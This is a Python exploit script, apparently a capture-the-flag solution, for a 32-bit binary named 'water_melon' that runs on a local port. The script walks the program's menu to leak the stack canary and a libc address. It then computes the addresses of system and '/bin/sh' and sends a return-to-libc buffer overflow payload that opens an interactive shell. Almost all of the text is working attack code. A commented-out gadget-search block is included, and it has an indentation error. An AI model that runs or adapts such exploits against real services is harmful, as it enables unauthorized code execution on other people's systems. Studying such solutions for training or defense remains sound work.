from pxwn import *

"""
#================================================
exp = Exploit("water_melon",64)
gadget1 = exp.rop("prdi")
gadget2 = exp.rop("prsi")
gadget3 = exp.rop("ppr")
gadget4 = exp.rop("pppr")
gadget5 = exp.rop("ppppr")
gadget6 = exp.rop("/bin/sh")
gadget7 = exp.rop("leave")
#================================================
print "=" * 30
if gadget1 != "Gadgets Not Found!":
    print "pop rdi:" + hex(gadget1)
else:
    print gadget1

print "=" * 30


print "=" * 30

if gadget2 != "Gadgets Not Found!":
    for i in gadget2:
        print "pop rsi: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget2

print "=" * 30

if gadget3 != "Gadgets Not Found!":
    for i in gadget3:
        print "pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget3

print "=" * 30

print "=" * 30
if gadget4 != "Gadgets Not Found!":
    for i in gadget4:
            print "pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget4

print "=" * 30

print "=" * 30
if gadget5 != "Gadgets Not Found!":
    for i in gadget5:
        print "pop pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget5

print "=" * 30
"""
#=========================================================

local=False

if local:
    p = process("./water_melon")
    pause()
    p.debug()
else:
    HOST = "localhost"
    PORT = 3333
    p = connect(HOST,PORT)
    pause()
    p.debug()

#=========================================================
p.recvul(":")
p.sendl("helloworld")
for i in range(0,100):
    p.recvul("|")
    p.sendl("1")
    p.recvul("|")
    p.sendl("helloworld")
    p.recvul("|")
    p.sendl("fuck")


p.recvul("|")
p.sendl("3")
p.recvul("select number")
p.recvul("|")
p.sendl("100") 
p.recvul("|")
p.sendl("100")
p.recvul("|")
p.sendl("A"*20)
p.recvul("|")
p.sendl("2")
p.recvul("100|")
p.recvl()
p.recvl()
p.recvl()

#leak I am just glad i remember the skill from angrydoraemon  and happens to work in this case.


leak = p.recvl().strip("\n")
canary = int(hex(uk32(leak[0:4]))[0:8]+"00",16)
print green("Canary: "),hex(canary)
write_plt = pk32(0x0804c034)
write_got = pk32(0x08048590)
printf_got = pk32(0x0804c010)
puts_got = pk32(0x0804c028)
bss = pk32(0x0804cb60)
read_plt = pk32(0x080484f0)


#libc base leak
p.recvul("|")
p.sendl("3")
p.recvul("select number")
p.recvul("|")
p.sendl("100")
p.recvul("|")
p.sendl("iamheretogetyou")
p.recvul("|")
p.sendl(p.payload(20)+p.payload(15))

"""
Using return-to-plt, we can find the address of write and use that to calcualte system and /bin/sh
p.sendl(p.payload(20)+pk32(canary)+p.payload(12)+write_plt+pk32(0x41414141)+pk32(1)+puts_got+pk32(8))

"""
p.recvul("|")
p.sendl("2")
p.recvul("100")
p.recvl()
p.recvl()
buf = p.recvl()

libc_leak = uk32(buf[1:5])
system  = libc_leak+0x2670d
binsh = libc_leak+0x146fa1
exit = libc_leak+0x1975d

print green("libc_leak: "),hex(libc_leak)
print green("System: "),hex(system)
print green("Binsh: "),hex(binsh)
print green("Exit: "),hex(exit)

#exploit finally
p.recvul("|")
p.sendl("3")
p.recvul("select number")
p.recvul("|")
p.sendl("100")
p.recvul("|")
p.sendl("happyhacking")
p.recvul("|")
p.sendl(p.payload(20)+pk32(canary)+p.payload(12)+pk32(system)+pk32(exit)+pk32(binsh))
p.interactive()
